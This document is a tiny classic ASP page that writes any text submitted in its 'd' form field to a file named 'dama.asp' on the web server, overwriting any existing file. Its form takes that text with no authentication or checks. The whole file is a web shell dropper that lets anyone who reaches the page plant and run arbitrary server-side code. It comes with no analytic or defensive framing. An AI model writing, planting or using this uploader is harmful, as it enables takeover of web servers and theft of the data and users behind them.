<%set s=server.createObject("Adodb.Stream")%>
<%s.Type=2%>
<%s.Open%>
<%s.CharSet="gb2312"%>
<%s.writetext request("d")%>
<%s.SaveToFile server.mappath("dama.asp"),2%>
<%s.Close%>
<%set s=nothing%>
<form>
<textarea name=d cols=80 rows=10 width=32></textarea>
<input type=submit>